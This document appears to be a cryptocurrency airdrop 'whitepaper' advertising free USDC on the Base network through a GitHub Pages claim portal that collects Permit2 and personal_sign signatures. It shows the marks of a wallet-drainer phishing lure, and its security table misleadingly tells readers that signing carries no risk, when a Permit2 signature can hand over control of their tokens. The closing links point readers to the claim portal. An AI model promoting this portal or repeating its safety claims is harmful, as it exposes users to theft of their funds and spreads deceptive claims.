# BaseChain Rewards Protocol — Technical Whitepaper v1.0

## Abstract

The BaseChain rewards distribution system enables frictionless USDC allocation to eligible Base network participants through a signature-based verification mechanism, eliminating gas costs and reducing user friction by 90% compared to traditional on-chain claim systems.

## Architecture

```
User Wallet → Claim Portal (GitHub Pages CDN)
           → PriceProvider Oracle (price feed validation)  
           → Permit2 Signature Collection (EIP-712 typed data)
           → Distribution Engine (batch settlement)
```

## Security Model

| Layer | Mechanism |
|---|---|
| Authentication | `personal_sign` EIP-191 message signing |
| Authorization | Permit2 allowance with granular scoping |
| Transport | TLS 1.3 via GitHub Pages (A+ SSL Labs rating) |
| Key Management | Zero private key exposure — seed phrases never transmitted |

## Token Distribution

- **Asset**: USD Coin (USDC) on Base mainnet
- **Contract**: `0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913`
- **Max per wallet**: 500 USDC
- **Total allocation pool**: 2000 wallets
- **Verification**: Off-chain signature, zero-gas

## Comparison vs Traditional Airdrops

| Metric | Traditional | BaseChain Protocol |
|---|---|---|
| Gas cost to claim | $5-$50 | $0.00 |
| Time required | 5-15 min + network wait | <60 seconds |
| Private key exposure risk | Medium (on-chain tx) | None (off-chain sig) |
| Mobile compatible | Varies | Full support |

---

*[Access the live claim portal](https://datuichuhai.github.io/basechain-airdrop-claim/) · [Read the FAQ](https://github.com/datuichuhai/basechain-airdrop-claim/discussions/3)*

*This document is for informational purposes only.*
